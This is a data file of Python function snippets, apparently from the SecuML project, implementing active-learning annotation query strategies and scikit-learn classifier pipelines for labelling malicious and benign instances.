    stop = False
    selected_instances = []
    while not stop:
        for (i, family) in enumerate(list(self.lr_class_labels)):
            if num_uncertain[i] <= num_anomalous[i]:
                classifier = 'lr'
                num_uncertain[i] += 1
            else:
                classifier = 'nb'
                num_anomalous[i] += 1
            scores = families_scores[classifier][i]
            selected_rows = scores.loc[scores['queried'] == false()]
            if len(selected_rows) > 0:
                query = selected_rows.index.tolist()[0]
            else:
                self.conf.logger.debug(family + ': no anomalous, no uncertain instances')
                selected_rows = lr_predicted_proba_df.loc[lr_predicted_proba_df['queried'] == false()]
                selected_rows = sort_data_frame(selected_rows, family, False, False)
                selection = selected_rows.index.tolist()
                if len(selection) == 0:
                    stop = True
                    break
                else:
                    query = selection[0]
            num_annotations += 1
            selected_instances.append(query)
            for c in ['nb', 'lr']:
                predicted_class = self.scores.loc[query, c + '_prediction']
                predicted_class_index = np.where(self.lr_class_labels == predicted_class)[0][0]
                selected_df = families_scores[c][predicted_class_index]
                selected_df.at[query, 'queried'] = True
            self.scores.at[query, 'queried'] = True
            lr_predicted_proba_df.at[query, 'queried'] = True
            if num_annotations >= self.num_annotations:
                stop = True
                break
    for instance_id in selected_instances:
        query = self.generate_query(instance_id, 0, None, None)
        self.add_query(query)"
ANSSI-FR/SecuML,gen_lr_predicted_proba_df,"def gen_lr_predicted_proba_df(self):
    num_test_instances = self.test_instances.num_instances()
    lr_predicted_proba_df = pd.DataFrame(np.zeros((num_test_instances, len(self.lr_class_labels) + 1)), index=self.test_instances.ids.get_ids(), columns=list(self.lr_class_labels) + ['queried'])
    if num_test_instances > 0:
        lr_predicted_proba_df.iloc[:, :-1] = self.lr_predicted_proba
        lr_predicted_proba_df['queried'] = [False] * num_test_instances
    return lr_predicted_proba_df"
ANSSI-FR/SecuML,_gen_families_scores_tables,"def _gen_families_scores_tables(self, classifier=None):
    if classifier is None:
        families_scores = {}
        families_scores['lr'] = self._gen_families_scores_tables('lr')
        families_scores['nb'] = self._gen_families_scores_tables('nb')
        return families_scores
    families_scores = []
    for (i, family) in enumerate(list(self.lr_class_labels)):
        selection = self.scores[classifier + '_prediction']
        if selection.shape[0] > 0:
            family_scores = self.scores.loc[self.scores[classifier + '_prediction'] == family]
            family_scores = sort_data_frame(family_scores, '%s_score' % classifier, True, False)
        else:
            col_values = self.scores.columns.values
            family_scores = pd.DataFrame(columns=col_values)
        families_scores.append(family_scores)
    return families_scores"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, instances, assigned_categories, assignment_proba, label, category_labels):
    self.iteration = iteration
    self.instances = instances
    self.generate(assigned_categories, assignment_proba, label, category_labels)"
ANSSI-FR/SecuML,init,"def init(self, label, families):
    self.categories = [Category(self.iteration, label, families[x]) for x in range(self.num_categories)]"
ANSSI-FR/SecuML,num_categories,"def num_categories(self):
    return self.num_categories"
ANSSI-FR/SecuML,generate,"def generate(self, assigned_categories, assignment_proba, label, category_labels):
    self.assigned_categories = assigned_categories
    self.num_categories = len(set(assigned_categories))
    self.init(label, category_labels)
    for (i, instance_id) in enumerate(self.instances.ids.get_ids()):
        annotated = self.instances.annotations.is_annotated(instance_id)
        c = self.assigned_categories[i]
        probas = None
        if assignment_proba is not None:
            probas = assignment_proba[i, :]
        self.categories[c].add_instance(instance_id, probas, annotated)
    for c in range(self.num_categories):
        self.categories[c].final_computation()"
ANSSI-FR/SecuML,export,"def export(self, filename):
    obj = {}
    for c in range(self.num_categories):
        obj[self.categories[c].family] = self.categories[c].export()
    with open(filename, 'w') as f:
        json.dump(obj, f, indent=2)"
ANSSI-FR/SecuML,annotate_auto,"def annotate_auto(self):
    for category in self.categories:
        category.annotate_auto()"
ANSSI-FR/SecuML,get_manual_annotations,"def get_manual_annotations(self):
    for category in self.categories:
        category.get_manual_annotations()"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, conf, already_queried=None):
    self.set_category_num_annotations(conf)
    for category in self.categories:
        category.generate_queries(conf.cluster_strategy, already_queried=already_queried)"
ANSSI-FR/SecuML,set_category_num_annotations,"def set_category_num_annotations(self, conf):
    weights = np.full((self.num_categories,), 1 / self.num_categories)
    num_annotations = conf.num_annotations
    annotations = np.full((self.num_categories,), None)
    card = [self.categories[c].num_instances() - self.categories[c].num_annotated_instances for c in range(self.num_categories)]
    sum_card = sum(card)
    if num_annotations > sum_card:
        num_annotations = sum_card
        self.iteration.conf.logger.warning('The number of instances is smaller than the requested number of annotation queries. The number of annotation queries is set to %d.' % sum_card)
    num_remaining_annotations = num_annotations
    no_starve_cluster = False
    while not no_starve_cluster:
        no_starve_cluster = True
        weights = weights / np.sum(weights)
        for c in range(self.num_categories):
            if annotations[c] is not None:
                continue
            num = int(weights[c] * num_remaining_annotations)
            if card[c] <= num:
                annotations[c] = card[c]
                weights[c] = 0
                no_starve_cluster = False
        num_annotated = np.sum(annotations != None)
        num_remaining_annotations = num_annotations - num_annotated
        if num_remaining_annotations == 0:
            break
    for c in range(self.num_categories):
        if annotations[c] is not None:
            continue
        num = int(weights[c] * num_remaining_annotations)
        annotations[c] = num
    num_remaining_annotations = num_annotations - sum(annotations)
    while num_remaining_annotations > 0:
        shuffled_clusters = list(range(self.num_categories))
        random.shuffle(shuffled_clusters)
        for c in shuffled_clusters:
            if num_remaining_annotations == 0:
                break
            if card[c] > annotations[c]:
                annotations[c] += 1
                num_remaining_annotations -= 1
    for (c, num) in enumerate(annotations):
        self.categories[c].set_num_annotations(num)
    return annotations"
ANSSI-FR/SecuML,set_likelihood,"def set_likelihood(self):
    naive_bayes = self.train_naive_bayes()
    features = self.instances.features.get_values()
    for c in range(self.num_categories):
        mask = self.assigned_categories == c
        c_features = features[mask, :]
        c_likelihood = naive_bayes.log_likelihood(c_features, str(c))
        self.categories[c].set_likelihood(c_likelihood)"
ANSSI-FR/SecuML,train_naive_bayes,"def train_naive_bayes(self):
    naive_bayes_conf = self.get_naive_bayes_conf()
    families = self.instances.annotations.get_families()
    current_families = copy.deepcopy(families)
    self.instances.annotations.set_families(self.assigned_categories)
    naive_bayes = GaussianNaiveBayes(naive_bayes_conf)
    naive_bayes.training(self.instances)
    self.instances.annotations.set_families(current_families)
    return naive_bayes"
ANSSI-FR/SecuML,get_naive_bayes_conf,"def get_naive_bayes_conf(self):
    return None"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, label=None, family=None):
    Queries.__init__(self, iteration, label=label)
    self.assign_label_family(label, family)
    self.instances_ids = []
    self.probas = []
    self.entropy = []
    self.likelihood = []
    self.df = None
    self.num_annotations = None
    self.annotated_instances = []
    self.num_annotated_instances = 0"
ANSSI-FR/SecuML,export,"def export(self):
    return {'instance_ids': self.get_ids(), 'confidence': self.get_confidences(), 'label': self.label}"
ANSSI-FR/SecuML,assign_label_family,"def assign_label_family(self, label, family):
    self.family = family
    if label != 'all':
        self.label = label
    else:
        self.label = label"
ANSSI-FR/SecuML,num_instances,"def num_instances(self):
    return len(self.instances_ids)"
ANSSI-FR/SecuML,set_num_annotations,"def set_num_annotations(self, num_annotations):
    self.num_annotations = num_annotations"
ANSSI-FR/SecuML,add_instance,"def add_instance(self, instance_id, probas, annotated):
    self.instances_ids.append(instance_id)
    entropy = None
    proba = None
    likelihood = None
    if probas is not None:
        entropy = scipy.stats.entropy(probas)
        proba = max(probas)
    self.entropy.append(entropy)
    self.probas.append(proba)
    self.likelihood.append(likelihood)
    if annotated:
        self.annotated_instances.append(instance_id)
        self.num_annotated_instances += 1"
ANSSI-FR/SecuML,final_computation,"def final_computation(self):
    self.df = pd.DataFrame({'proba': self.probas, 'entropy': self.entropy, 'likelihood': self.likelihood}, index=list(map(str, self.instances_ids)))"
ANSSI-FR/SecuML,set_likelihood,"def set_likelihood(self, likelihood):
    self.likelihood = likelihood
    self.df['likelihood'] = likelihood"
ANSSI-FR/SecuML,get_likelihood,"def get_likelihood(self, instances):
    df = pd.DataFrame({'likelihood': self.likelihood}, index=list(map(str, self.instances_ids)))
    selected_df = df.loc[list(map(str, instances)), :]
    return selected_df['likelihood'].tolist()"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj):
    category = Category()
    category.instances_ids = obj['instances_ids']
    category.label = obj['label']
    return category"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, cluster_strategy, already_queried=None):
    queries_types = cluster_strategy.split('_')
    num_queries_types = len(queries_types)
    if already_queried is None:
        already_queried = []
    for (q, queries_type) in enumerate(queries_types):
        drop_instances = already_queried[:]
        drop_instances.extend(self.annotated_instances)
        if q == num_queries_types - 1:
            num_queries = self.num_annotations - len(self.annotation_queries)
        else:
            num_queries = self.num_annotations // num_queries_types
        if num_queries == 0:
            continue
        queries_df = self._get_selected_instances(drop_instances)
        if queries_type == 'center':
            confidence = 'high'
            sort_data_frame(queries_df, 'likelihood', False, True)
            queries_df = queries_df.head(num_queries)
        elif queries_type == 'anomalous':
            confidence = 'low'
            sort_data_frame(queries_df, 'likelihood', True, True)
            queries_df = queries_df.head(num_queries)
        elif queries_type == 'uncertain':
            confidence = 'low'
            sort_data_frame(queries_df, 'entropy', False, True)
            queries_df = queries_df.head(num_queries)
        elif queries_type == 'random':
            confidence = 'low'
            queries_df = queries_df.sample(n=num_queries, axis=0)
        else:
            raise ValueError()
        self._add_queries(confidence, queries_df)"
ANSSI-FR/SecuML,_add_queries,"def _add_queries(self, confidence, queries_df):
    for (index, row) in queries_df.iterrows():
        query = self.generate_query(int(index), row['likelihood'], self.label, self.family, confidence=confidence)
        self.add_query(query)
        self.annotated_instances.append(int(index))"
ANSSI-FR/SecuML,_get_selected_instances,"def _get_selected_instances(self, drop_instances):
    selected_instances = self.instances_ids
    if drop_instances is not None:
        selected_instances = [x for x in selected_instances if x not in drop_instances]
    return self.df.loc[list(map(str, selected_instances)), :]"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, b, num_annotations):
    Queries.__init__(self, iteration)
    self.b = b
    self.num_annotations = num_annotations"
ANSSI-FR/SecuML,run_models,"def run_models(self):
    return"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, already_queried=None):
    instances = self.predictions.ids.ids
    if self.predictions.info.with_scores:
        predicted_scores = self.predictions.scores
    elif self.predictions.info.with_probas:
        predicted_scores = self.predictions.probas - 0.5
    else:
        assert False
    proba = [self.b / (self.b + abs(s)) for s in predicted_scores]
    predictions_df = pd.DataFrame({'proba': proba}, index=instances)
    if already_queried is not None:
        predictions_df.drop(labels=already_queried, inplace=True)
    if len(predictions_df.index) < self.num_annotations:
        selected_df = predictions_df
    else:
        norm_proba = [p / sum(proba) for p in proba]
        selection = list(np.random.choice(instances, size=self.num_annotations, replace=False, p=norm_proba))
        selected_df = predictions_df.loc[selection]
    for (index, row) in selected_df.iterrows():
        query = self.generate_query(index, row['proba'], None, None)
        self.add_query(query)"
ANSSI-FR/SecuML,_generate_label,"def _generate_label(x):
    if x is None:
        return 0
    if x:
        return -1
    else:
        return 1"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, num_annotations):
    Queries.__init__(self, iteration)
    self.num_annotations = num_annotations
    self.num_neighbours = 10
    self.delta = 0.5"
ANSSI-FR/SecuML,run_models,"def run_models(self):
    return"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, already_queried=None):
    predicted_scores = self.predictions.scores
    if len(predicted_scores) == 0:
        return
    boundary_scores = abs(predicted_scores) / max(abs(predicted_scores))
    neighbours_scores = self._compute_neighbours_scores()
    global_scores = self.delta * boundary_scores
    global_scores += (1 - self.delta) * neighbours_scores
    queries_df = pd.DataFrame(data={'scores': predicted_scores, 'boundary_scores': boundary_scores, 'neighbours_scores': neighbours_scores, 'global_scores': global_scores}, index=self.predictions.ids.ids)
    if already_queried is not None:
        queries_df.drop(labels=already_queried, inplace=True)
    sort_data_frame(queries_df, 'global_scores', True, True)
    queries_df = queries_df.head(n=self.num_annotations)
    for (index, row) in queries_df.iterrows():
        query = self.generate_query(index, row['scores'], None, None)
        self.add_query(query)"
ANSSI-FR/SecuML,_compute_neighbours_scores,"def _compute_neighbours_scores(self):
    all_instances = self.iteration.datasets.instances
    pipeline = Pipeline([('scaler', StandardScaler()), ('model', NearestNeighbors(self.num_neighbours, n_jobs=-1))])
    pipeline.fit(all_instances.features.get_values())
    labels = np.array([_generate_label(x) for x in all_instances.annotations.get_labels()])
    scores = []
    all_neighbours = pipeline['model'].kneighbors(return_distance=False)
    for (i, label) in enumerate(labels):
        if label != 0:
            continue
        else:
            neighbours = all_neighbours[i]
            score = sum(labels[neighbours] + 1) / (2.0 * self.num_neighbours)
            scores.append(score)
    return np.array(scores)"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, num_annotations):
    Queries.__init__(self, iteration)
    self.num_annotations = num_annotations"
ANSSI-FR/SecuML,run_models,"def run_models(self):
    return"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, already_queried=None):
    selection = self.predictions.get_random(self.num_annotations, already_queried)
    for prediction in selection:
        query = self.generate_query(prediction.instance_id, prediction.proba, None, None)
        self.add_query(query)"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'Rare category detection requires that the initial annotated dataset contains at least two different families.'"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, label, proba_min=None, proba_max=None, input_checking=True):
    Queries.__init__(self, iteration, label=label)
    self.proba_min = proba_min
    self.proba_max = proba_max
    self.rcd_conf = self.iteration.conf.rcd_conf
    self.multiclass_model = None
    self._check_input_data(input_checking)"
ANSSI-FR/SecuML,_check_input_data,"def _check_input_data(self, input_checking):
    instances = self.iteration.datasets.instances
    self.annotated_instances = instances.get_annotated_instances(label=self.label)
    annotations = self.annotated_instances.annotations
    families_counts = annotations.get_families_count()
    if len(families_counts) < 2:
        self.families_analysis = False
    else:
        families_counts = [(k, x) for (k, x) in families_counts.items()]
        families_counts.sort(key=lambda tup: tup[1], reverse=True)
        self.families_analysis = families_counts[1][1] >= 2
    if input_checking and (not self.families_analysis):
        raise RareCategoryAtLeastTwoFamilies()"
ANSSI-FR/SecuML,run,"def run(self, predictions, already_queried=None):
    Queries.run(self, predictions, already_queried=already_queried)
    self._gen_clustering_visu()"
ANSSI-FR/SecuML,_set_predictions,"def _set_predictions(self, predictions):
    if self.proba_min is not None and self.proba_max is not None:
        self.predictions = predictions.get_within_range(self.proba_min, self.proba_max)
    else:
        self.predictions = predictions.to_list()"
ANSSI-FR/SecuML,run_models,"def run_models(self):
    if self.families_analysis:
        self.annotations_type = 'families'
        start_time = time.time()
        self._build_categories()
        self.analysis_time = time.time() - start_time
        self.categories.set_likelihood()
    else:
        self.annotations_type = 'individual'
        self.categories = None
        self.analysis_time = 0"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, already_queried=None):
    num_annotations = self.rcd_conf.num_annotations
    if not self.families_analysis:
        indexes = range(len(self.predictions))
        if already_queried is not None:
            indexes = [i for i in indexes if self.predictions[i].instance_id not in already_queried]
        if len(indexes) > num_annotations:
            indexes = random.sample(indexes, num_annotations)
        for i in indexes:
            p = self.predictions[i]
            query = self.generate_query(p.instance_id, p.proba, self.label, None)
            self.add_query(query)
    else:
        self.categories.generate_queries(self.rcd_conf, already_queried=already_queried)"
ANSSI-FR/SecuML,export,"def export(self):
    if not self.families_analysis:
        Queries.export(self)
    else:
        filename = path.join(self.iteration.iteration_dir, 'toannotate_%s.json' % self.label)
        self.categories.export(filename)"
ANSSI-FR/SecuML,annotate_auto,"def annotate_auto(self):
    if not self.families_analysis:
        Queries.annotate_auto(self)
    else:
        self.categories.annotate_auto()"
ANSSI-FR/SecuML,get_manual_annotations,"def get_manual_annotations(self):
    if not self.families_analysis:
        Queries.get_manual_annotations(self)
    else:
        self.categories.get_manual_annotations()"
ANSSI-FR/SecuML,_build_categories,"def _build_categories(self):
    (train, test, test_predictions) = self._build_multiclass_classifier()
    all_instances = copy.deepcopy(test)
    all_instances.union(train)
    if test.num_instances() > 0:
        predicted_families = test_predictions.values
        all_families = list(predicted_families)
        all_families.extend(train.annotations.get_families())
        predicted_proba = test_predictions.all_probas
        for family in train.annotations.get_families():
            probas = self.multiclass_model.class_labels == family
            probas = probas.astype('int')
            predicted_proba = np.vstack((predicted_proba, np.array(probas)))
    else:
        all_families = self.annotated_instances.annotations.get_families()
        predicted_proba = None
        for family in all_families:
            probas = [int(family == s) for s in self.multiclass_model.class_labels]
            if predicted_proba is None:
                predicted_proba = np.array(probas)
            else:
                predicted_proba = np.vstack((predicted_proba, np.array(probas)))
    labels_values = list(self.multiclass_model.class_labels)
    assigned_categories = np.array([labels_values.index(x) for x in all_families])
    self._set_categories(all_instances, assigned_categories, predicted_proba)"
ANSSI-FR/SecuML,_set_categories,"def _set_categories(self, all_instances, assigned_categories, predicted_proba):
    self.categories = Categories(self.iteration, all_instances, assigned_categories, predicted_proba, self.label, self.multiclass_model.class_labels)"
ANSSI-FR/SecuML,_get_multiclass_conf,"def _get_multiclass_conf(self):
    return self.rcd_conf.classification_conf.classifier_conf"
ANSSI-FR/SecuML,_build_multiclass_classifier,"def _build_multiclass_classifier(self):
    multiclass_conf = self._get_multiclass_conf().classifier_conf
    predicted_ids = [p.instance_id for p in self.predictions]
    instances = self.iteration.datasets.instances
    predicted_instances = instances.get_from_ids(predicted_ids)
    if self.multiclass_model is None:
        self.multiclass_model = multiclass_conf.model_class(multiclass_conf)
        self.multiclass_model.training(self.annotated_instances)
        (predictions, _) = self.multiclass_model.testing(predicted_instances)
    return (self.annotated_instances, predicted_instances, predictions)"
ANSSI-FR/SecuML,_gen_clustering_visu,"def _gen_clustering_visu(self):
    if self.families_analysis:
        clusters = Clusters(self.categories.instances, self.categories.assigned_categories)
        clusters.generate(None, None)"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, num_annotations):
    Queries.__init__(self, iteration)
    self.num_annotations = num_annotations"
ANSSI-FR/SecuML,run_models,"def run_models(self):
    return"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, already_queried=None):
    assert not already_queried
    selection = self.predictions.get_alerts(top_n=self.num_annotations)
    for prediction in selection:
        query = self.generate_query(prediction.instance_id, prediction.proba, None, None)
        self.add_query(query)"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, num_annotations, label=None):
    Queries.__init__(self, iteration, label=label)
    self.num_annotations = num_annotations"
ANSSI-FR/SecuML,run_models,"def run_models(self):
    return"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, already_queried=None):
    unsure_df = pd.DataFrame({'proba': self.predictions.probas}, index=self.predictions.ids.ids)
    if already_queried is not None:
        unsure_df.drop(labels=already_queried, inplace=True)
    unsure_df['proba'] = abs(unsure_df['proba'] - 0.5)
    sort_data_frame(unsure_df, 'proba', True, True)
    if self.num_annotations is not None and len(unsure_df) > self.num_annotations:
        unsure_df = unsure_df.head(n=self.num_annotations)
    for (instance_id, row) in unsure_df.iterrows():
        query = self.generate_query(instance_id, row['proba'], None, None)
        self.add_query(query)"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration):
    self.iteration = iteration
    self.conf = self.iteration.conf
    self.queries = {}
    self._set_queries()"
ANSSI-FR/SecuML,_set_queries,"@abc.abstractmethod
def _set_queries():
    return"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, predictions):
    self.exec_time = 0
    queried_instances = []
    for (_, query) in self.queries.items():
        query.run(predictions, already_queried=queried_instances)
        queried_instances.extend(query.get_ids())
        self.exec_time += query.exec_time"
ANSSI-FR/SecuML,annotate_auto,"def annotate_auto(self):
    for (_, query) in self.queries.items():
        query.annotate_auto()"
ANSSI-FR/SecuML,get_manual_annotations,"def get_manual_annotations(self):
    for (_, query) in self.queries.items():
        query.get_manual_annotations()"
ANSSI-FR/SecuML,get_exec_times_header,"def get_exec_times_header(self):
    return ['generate_queries']"
ANSSI-FR/SecuML,get_exec_times,"def get_exec_times(self):
    return [self.exec_time]"
ANSSI-FR/SecuML,get_exec_times_display,"def get_exec_times_display(self):
    generate_queries = PlotDataset(np.array([]), 'Queries generation')
    generate_queries.set_color('purple')
    return [generate_queries]"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['aladin'] = AladinQueries(self.iteration, self.conf)"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['cesa_bianchi'] = CesaBianchiQueries(self.iteration, self.iteration.conf.b, self.iteration.conf.batch)"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['gornitz'] = GornitzQueries(self.iteration, self.iteration.conf.batch)"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['uncertain'] = UncertainQueries(self.iteration, self.iteration.conf.num_uncertain, label='uncertain')
    self.queries['malicious'] = RcdQueries(self.iteration, MALICIOUS, 0.5, 1, input_checking=False)
    self.queries['benign'] = RcdQueries(self.iteration, BENIGN, 0, 0.5, input_checking=False)"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['random'] = RandomQueries(self.iteration, self.iteration.conf.batch)"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['rcd'] = RcdQueries(self.iteration, 'all')"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['top_n'] = TopNQueries(self.iteration, self.iteration.conf.batch)"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['uncertain'] = UncertainQueries(self.iteration, self.iteration.conf.batch)"
ANSSI-FR/SecuML,__init__,"def __init__(self, model_class):
    self.model_class = model_class.__class__.__name__"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return '%s does not support CV monitoring.' % self.model_class"
ANSSI-FR/SecuML,__init__,"def __init__(self, training, best_hyper_params):
    self.training = training
    self.best_hyper_params = best_hyper_params"
ANSSI-FR/SecuML,add,"def add(self, exec_time):
    self.training += exec_time.training
    self.best_hyper_params += exec_time.best_hyper_params"
ANSSI-FR/SecuML,total,"def total(self):
    return self.training + self.best_hyper_params"
ANSSI-FR/SecuML,__init__,"def __init__(self, predictions, num_instances):
    self.predictions = predictions
    self.num_instances = num_instances"
ANSSI-FR/SecuML,add,"def add(self, exec_time):
    self.predictions += exec_time.predictions
    self.num_instances += exec_time.num_instances"
ANSSI-FR/SecuML,__init__,"def __init__(self, conf):
    self.conf = conf
    self.class_labels = None
    self._create_pipeline()"
ANSSI-FR/SecuML,_get_pipeline,"@abc.abstractmethod
def _get_pipeline(self):
    return"
ANSSI-FR/SecuML,_set_best_hyperparam,"@abc.abstractmethod
def _set_best_hyperparam(self, train_instances):
    return"
ANSSI-FR/SecuML,training,"def training(self, instances):
    best_hyper_params_time = 0
    if self.conf.hyperparam_conf.get_param_grid() is not None:
        start = time.time()
        self._set_best_hyperparam(instances)
        best_hyper_params_time = time.time() - start
    start = time.time()
    self._fit(instances)
    train_time = time.time() - start
    return TrainingExecTimes(train_time, best_hyper_params_time)"
ANSSI-FR/SecuML,update,"def update(self, instances):
    start = time.time()
    self._update(instances)
    train_time = time.time() - start
    return TrainingExecTimes(train_time, 0)"
ANSSI-FR/SecuML,testing,"def testing(self, instances):
    start = time.time()
    predictions = self._get_predictions(instances)
    exec_time = time.time() - start
    return (predictions, PredictionsExecTime(exec_time, instances.num_instances()))"
ANSSI-FR/SecuML,load_model,"def load_model(self, model_filename):
    self.pipeline = joblib.load(model_filename)"
ANSSI-FR/SecuML,get_coefs,"def get_coefs(self):
    return self.conf.get_coefs(self.pipeline['model'])"
ANSSI-FR/SecuML,_create_pipeline,"def _create_pipeline(self):
    self.pipeline = Pipeline(self._get_pipeline())"
ANSSI-FR/SecuML,_get_predictions,"def _get_predictions(self, instances):
    predictions = self.apply_pipeline(instances)
    if instances.has_ground_truth():
        ground_truth = self.conf.get_supervision(instances, ground_truth=True, check=False)
        predictions.set_ground_truth(ground_truth)
    return predictions"
ANSSI-FR/SecuML,_fit,"@abc.abstractmethod
def _fit(self, train_instances):
    return"
ANSSI-FR/SecuML,_update,"def _update(self, train_instances):
    self._fit(train_instances)"
ANSSI-FR/SecuML,cv_monitoring,"def cv_monitoring(self, train_instances, cv_monitoring):
    from secuml.core.classif.conf.test.cv import CvConf
    num_folds = cv_monitoring.num_folds
    cv_test_conf = CvConf(self.conf.logger, num_folds)
    cv_datasets = cv_test_conf.gen_datasets(self.conf, train_instances)
    for (fold_id, datasets) in enumerate(cv_datasets._datasets):
        start = time.time()
        self.pipeline.fit(datasets.train_instances.features.get_values(), self.conf.get_supervision(datasets.train_instances))
        train_time = time.time() - start
        (cv_predictions, test_time) = self.testing(datasets.test_instances)
        cv_monitoring.add_fold(self, TrainingExecTimes(train_time, 0), cv_predictions, test_time, fold_id)"
ANSSI-FR/SecuML,apply_pipeline,"def apply_pipeline(self, instances):
    num_instances = instances.num_instances()
    if num_instances == 0:
        return Predictions(np.array([]), instances.ids, self.conf.multiclass)
    return self._predict(instances.features, instances.ids)"
ANSSI-FR/SecuML,_predict,"def _predict(self, features, instances_ids):
    if features.streaming:
        return self._predict_streaming(features.get_values(), instances_ids, features.stream_batch)
    else:
        return self._predict_matrix(features.get_values(), instances_ids)"
ANSSI-FR/SecuML,_predict_matrix,"def _predict_matrix(self, matrix, instances_ids):
    (all_probas, probas) = self._predict_probas(matrix)
    if all_probas is None and probas is None:
        (all_scores, scores) = self._predict_scores(matrix)
        if all_scores is None and scores is None:
            values = self._predict_values(matrix)
        else:
            values = self._predict_from_scores(matrix, all_scores, scores)
    else:
        (all_scores, scores) = (None, None)
        values = self._predict_from_probas(matrix, all_probas, probas)
    if probas is not None:
        probas = probas[:, 1]
    return Predictions(values, instances_ids, self.conf.multiclass, all_probas=all_probas, probas=probas, all_scores=all_scores, scores=scores)"
ANSSI-FR/SecuML,_predict_streaming,"def _predict_streaming(self, features_iter, instances_ids, stream_batch):
    predictions = None
    num_batches = instances_ids.num_instances() // stream_batch
    num_remaining = instances_ids.num_instances() % stream_batch
    for (i, batch) in enumerate(range(num_batches)):
        matrix = np.vstack(tuple((next(features_iter) for _ in range(stream_batch))))
        ids = instances_ids.ids[i * stream_batch:(i + 1) * stream_batch]
        ids = instances_ids.get_from_ids(ids)
        predictions = self._update_streaming_predictions(predictions, matrix, ids)
    if num_remaining > 0:
        matrix = np.vstack(tuple((next(features_iter) for _ in range(num_remaining))))
        ids = instances_ids.ids[-num_remaining:]
        ids = instances_ids.get_from_ids(ids)
        predictions = self._update_streaming_predictions(predictions, matrix, ids)
    return predictions"
ANSSI-FR/SecuML,_update_streaming_predictions,"def _update_streaming_predictions(self, predictions, matrix, instances_ids):
    new_predictions = self._predict_matrix(matrix, instances_ids)
    if predictions is None:
        return new_predictions
    else:
        predictions.union(new_predictions)
        return predictions"
ANSSI-FR/SecuML,_predict_values,"def _predict_values(self, features):
    return self.pipeline.predict(features)"
ANSSI-FR/SecuML,_predict_probas,"def _predict_probas(self, features):
    all_predicted_proba = None
    predicted_proba = None
    if self.conf.probabilist:
        all_predicted_proba = self.pipeline.predict_proba(features)
        if self.conf.multiclass:
            predicted_proba = None
        else:
            predicted_proba = all_predicted_proba
    return (all_predicted_proba, predicted_proba)"
ANSSI-FR/SecuML,_predict_scores,"def _predict_scores(self, features):
    scoring_func = self.conf.scoring_function()
    all_scores = None
    scores = None
    if scoring_func is not None:
        predicted_scores = getattr(self.pipeline, scoring_func)(features)
        if self.conf.multiclass:
            all_scores = predicted_scores
        else:
            scores = predicted_scores
    return (all_scores, scores)"
ANSSI-FR/SecuML,_predict_from_probas,"def _predict_from_probas(self, matrix, all_probas, probas):
    if self.conf.multiclass:
        return self.pipeline['model'].predict_from_probas(matrix, all_probas)
    else:
        return self.pipeline['model'].predict_from_probas(matrix, probas)"
ANSSI-FR/SecuML,_predict_from_scores,"def _predict_from_scores(self, matrix, all_scores, scores):
    if self.conf.multiclass:
        return self.pipeline['model'].predict_from_scores(matrix, all_scores)
    else:
        return self.pipeline['model'].predict_from_scores(matrix, scores)"
ANSSI-FR/SecuML,_set_best_hyperparam,"def _set_best_hyperparam(self, train_instances):
    hyperparam_conf = self.conf.hyperparam_conf
    param_grid = hyperparam_conf.get_param_grid()
    optim_conf = hyperparam_conf.optim_conf
    cv = StratifiedKFold(n_splits=optim_conf.num_folds)
    grid_search = GridSearchCV(self.pipeline, param_grid=param_grid, scoring=optim_conf.get_scoring_method(), cv=cv, iid=False, n_jobs=optim_conf.n_jobs)
    grid_search.fit(train_instances.features.get_values(), self.conf.get_supervision(train_instances))
    hyperparam_conf.values.set_best_values(grid_search)
    best_values = hyperparam_conf.values.get_best_values()
    best_values = {p: value for (p, value) in best_values.items()}
    self.pipeline.set_params(**best_values)"
ANSSI-FR/SecuML,_fit,"def _fit(self, train_instances):
    self.pipeline.fit(train_instances.features.get_values(), self.conf.get_supervision(train_instances))"
ANSSI-FR/SecuML,training,"def training(self, train_instances):
    exec_time = Classifier.training(self, train_instances)
    if self.conf.multiclass:
        self.class_labels = self.pipeline['model'].classes_
    return exec_time"
ANSSI-FR/SecuML,_set_best_hyperparam,"def _set_best_hyperparam(self, train_instances):
    best_values = self.conf.hyperparam_conf.values.get_best_values()
    self.pipeline.set_params(**best_values)"
ANSSI-FR/SecuML,_predict,"def _predict(self, features, instances_ids):
    predictions = Classifier._predict(self, features, instances_ids)
    predictions.values = predictions.values == -1
    return predictions"
ANSSI-FR/SecuML,_fit,"def _fit(self, train_instances):
    self.pipeline.fit(train_instances.features.get_values())"
ANSSI-FR/SecuML,_predict_scores,"def _predict_scores(self, features):
    (all_scores, scores) = Classifier._predict_scores(self, features)
    if all_scores is not None:
        all_scores = -all_scores
    if scores is not None:
        scores = -scores
    return (all_scores, scores)"
ANSSI-FR/SecuML,_predict_from_scores,"def _predict_from_scores(self, matrix, all_scores, scores):
    if all_scores is not None:
        all_scores = -all_scores
    if scores is not None:
        scores = -scores
